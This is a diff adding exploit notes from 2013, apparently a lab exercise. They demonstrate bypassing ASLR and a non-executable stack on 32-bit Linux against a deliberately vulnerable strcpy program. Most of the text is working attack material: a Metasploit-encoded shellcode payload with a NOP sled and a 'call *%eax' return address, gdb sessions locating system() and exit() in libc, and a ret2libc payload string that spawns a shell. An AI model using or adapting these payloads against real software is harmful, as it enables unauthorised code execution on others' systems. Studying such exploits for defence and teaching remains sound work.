@@ -1,0 +1,146 @@
+Shawn the R0ck - May 27 2013
+
+The way to bypass the ASLR only without PIE.
+
+Find the addr you can use:
+ 80483df:	ff d0                	call   *%eax
+
+Generate shellcode for spawn a shell:
+root@bt:/home/shawn# msfpayload linux/x86/exec CMD=dash R | msfencode -a x86 -e x86/alpha_mixed -b "\x00\x0a\x0d" -t c
+[*] x86/alpha_mixed succeeded with size 142 (iteration=1)
+
+The final exp:
+shawn@bt:/citypw-SCFE/security/bypass_exp$ ./aslr `python -c 'print "\x90" * 400 + "\x89\xe1\xda\xda\xd9\x71\xf4\x5b\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x52\x4a\x64\x4b\x62\x78\x4a\x39\x61\x42\x43\x56\x31\x78\x44\x6d\x50\x63\x6c\x49\x6b\x57\x35\x38\x76\x4f\x51\x63\x31\x78\x53\x30\x70\x68\x44\x6f\x55\x32\x43\x59\x42\x4e\x6b\x39\x5a\x43\x62\x72\x79\x78\x64\x45\x77\x70\x43\x30\x45\x50\x32\x44\x71\x71\x53\x43\x51\x78\x33\x30\x73\x67\x73\x63\x6f\x79\x68\x61\x7a\x6d\x4d\x50\x41\x41" + "\x90" * 462 + "\xdf\x83\x04\x08"'`
+$ id
+uid=1001(shawn) gid=1001(shawn) groups=1001(shawn)
+
+-------------------------------------------------------------------------------------------------------
+Use ret2libc technique bypass the non-executable stack:
+
+shawn@bt:/bypass_exp$ gdb ./non_exec_stack -q
+Reading symbols from /bypass_exp/non_exec_stack...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048404 <+0>:	push   %ebp
+   0x08048405 <+1>:	mov    %esp,%ebp
+   0x08048407 <+3>:	and    $0xfffffff0,%esp
+   0x0804840a <+6>:	sub    $0x10,%esp
+   0x0804840d <+9>:	mov    0xc(%ebp),%eax
+   0x08048410 <+12>:	add    $0x4,%eax
+   0x08048413 <+15>:	mov    (%eax),%eax
+   0x08048415 <+17>:	mov    %eax,(%esp)
+   0x08048418 <+20>:	call   0x80483e4 <evilfunction>
+   0x0804841d <+25>:	mov    $0x0,%eax
+   0x08048422 <+30>:	leave  
+   0x08048423 <+31>:	ret    
+End of assembler dump.
+(gdb) b *0x08048418
+Breakpoint 1 at 0x8048418: file victim.c, line 10.
+(gdb) disassemble evilfunction 
+Dump of assembler code for function evilfunction:
+   0x080483e4 <+0>:	push   %ebp
+   0x080483e5 <+1>:	mov    %esp,%ebp
+   0x080483e7 <+3>:	sub    $0x408,%esp
+   0x080483ed <+9>:	mov    0x8(%ebp),%eax
+   0x080483f0 <+12>:	mov    %eax,0x4(%esp)
+   0x080483f4 <+16>:	lea    -0x3f0(%ebp),%eax
+   0x080483fa <+22>:	mov    %eax,(%esp)
+   0x080483fd <+25>:	call   0x804831c <strcpy@plt>
+   0x08048402 <+30>:	leave  
+   0x08048403 <+31>:	ret    
+End of assembler dump.
+(gdb) b *0x08048403
+Breakpoint 2 at 0x8048403: file victim.c, line 7.
+(gdb) r aaa
+Starting program: /bypass_exp/non_exec_stack aaa
+
+Breakpoint 1, 0x08048418 in main (argc=2, argv=0xbffff3c4) at victim.c:10
+10	evilfunction(argv[1]);
+(gdb) x/4000s $esp
+0xbfffef00:	 "\206\361\377\277\200\020\377\267K\204\004\b\364/\374\267@\204\004\b"
+0xbfffef15:	 ""
+0xbffff186:	 'A' <repeats 200 times>...
+0xbffff24e:	 'A' <repeats 200 times>...
+0xbffff316:	 'A' <repeats 200 times>...
+0xbffff3de:	 'A' <repeats 200 times>...
+0xbffff4a6:	 'A' <repeats 200 times>...
+0xbffff56e:	 'A' <repeats 12 times>"\260, ;\352\267\060r\351\267*\366\377\277"
+0xbffff587:	 "CPLUS_INCLUDE_PATH=/citypw/root_shawn/include"
+0xbffff5b5:	 "ORBIT_SOCKETDIR=/tmp/orbit-shawn"
+0xbffff5d6:	 "SSH_AGENT_PID=1610"
+0xbffff5e9:	 "GPG_AGENT_INFO=/tmp/gpg-5tYtl2/S.gpg-agent:1611:1"
+0xbffff61b:	 "SHELL=/bin/bash"
+0xbffff62b:	 "TERM=xterm"
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) x/s 0xbffff61b+6
+0xbffff621:	 "/bin/bash"
+(gdb) si
+evilfunction (input=0xbffff583 "aaa") at victim.c:4
+4	{
+(gdb) i r esp
+esp            0xbffff2fc	0xbffff2fc
+(gdb) r `python -c 'print "A" * 1032'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /bypass_exp/non_exec_stack `python -c 'print "A" * 1032'`
+
+Breakpoint 1, 0x08048418 in main (argc=2, argv=0xbfffefb4) at victim.c:10
+10	evilfunction(argv[1]);
+(gdb) si
+evilfunction (input=0xbffff17e 'A' <repeats 200 times>...) at victim.c:4
+4	{
+(gdb) i r esp
+esp            0xbfffeeec	0xbfffeeec
+(gdb) x/30x 0xbfffeeec-0x20
+0xbfffeecc:	0x080482e8	0xb7ff1080	0x08049ff4	0xbfffef08
+0xbfffeedc:	0x08048459	0xb7fc3324	0xb7fc2ff4	0x08048440
+0xbfffeeec:	0x0804841d	0xbffff17e	0xb7ff1080	0x0804844b
+0xbfffeefc:	0xb7fc2ff4	0x08048440	0x00000000	0xbfffef88
+0xbfffef0c:	0xb7e7ebd6	0x00000002	0xbfffefb4	0xbfffefc0
+0xbfffef1c:	0xb7fe1858	0xbfffef70	0xffffffff	0xb7ffeff4
+0xbfffef2c:	0x08048254	0x00000001	0xbfffef70	0xb7ff0676
+0xbfffef3c:	0xb7fffab0	0xb7fe1b48
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048403 in evilfunction (input=Cannot access memory at address 0x41414149
+) at victim.c:7
+7	}
+(gdb) x/30x 0xbfffeeec-0x20
+0xbfffeecc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeedc:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeeec:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbfffeefc:	0x41414141	0x08048400	0x00000000	0xbfffef88
+0xbfffef0c:	0xb7e7ebd6	0x00000002	0xbfffefb4	0xbfffefc0
+0xbfffef1c:	0xb7fe1858	0xbfffef70	0xffffffff	0xb7ffeff4
+0xbfffef2c:	0x08048254	0x00000001	0xbfffef70	0xb7ff0676
+0xbfffef3c:	0xb7fffab0	0xb7fe1b48
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7ea3bb0 <__libc_system>
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e97230 <*__GI_exit>
+
+(gdb) r `python -c 'print "A" * 1012 + "\xb0\x3b\xea\xb7" + "\x30\x72\xe9\xb7" + "\x21\xf6\xff\xbf"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /bypass_exp/non_exec_stack `python -c 'print "A" * 1012 + "\xb0\x3b\xea\xb7" + "\x30\x72\xe9\xb7" + "\x21\xf6\xff\xbf"'`
+
+Breakpoint 1, 0x08048418 in main (argc=2, argv=0xbfffefc4) at victim.c:10
+10	evilfunction(argv[1]);
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048403 in evilfunction (input=Cannot access memory at address 0x41414149
+) at victim.c:7
+7	}
+(gdb) c
+Continuing.
+shawn@bt:/bypass_exp$ id
+uid=1001(shawn) gid=1001(shawn) groups=1001(shawn)
+
+
+
+
